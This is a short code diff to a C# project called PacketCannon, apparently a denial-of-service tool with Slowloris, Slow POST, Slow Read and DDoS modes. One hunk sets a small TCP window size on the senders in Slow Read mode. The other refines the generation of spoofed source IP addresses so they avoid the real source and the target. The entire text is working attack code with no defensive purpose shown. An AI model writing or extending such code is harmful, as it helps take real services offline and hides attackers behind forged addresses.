@@ -89,6 +89,15 @@ namespace PacketCannon
             {
                 dosSenders.Add(new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
             }
+
+            if (_attackMode == Attacks.SlowRead)
+            {
+                foreach (var dosSender in dosSenders)
+                {
+                    dosSender.WindowSize = (ushort)SlowReadWindowSize;
+                }
+            }
+
             var watcher = new Thread(SearchForPackets);
             watcher.Start();
             using (Communicator = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
@@ -246,7 +255,7 @@ namespace PacketCannon
             {
                 var ipAddressFaked = new IpV4Address($"{ipAddress[0]}.{ipAddress[1]}.{ipAddress[2]}.{rnd.Next(FakeIpAddressMin, FakeIpAddressMax)}");
                 //var ipAddressFaked = new IpV4Address(ipAddress[0] + ipAddress[1] + ipAddress[2] + rnd.Next(FakeIpAddressMin, FakeIpAddressMax));
-                if (!FakeIpV4Addresses.Contains(ipAddressFaked) && ipAddressFaked.ToString() != SourceIpv4)
+                if (!FakeIpV4Addresses.Contains(ipAddressFaked) && !ipAddressFaked.ToString().Equals(SourceIpv4) && !ipAddressFaked.ToString().Equals(DestinationIpV4))
                 {
                     FakeIpV4Addresses.Add(ipAddressFaked);
                 }
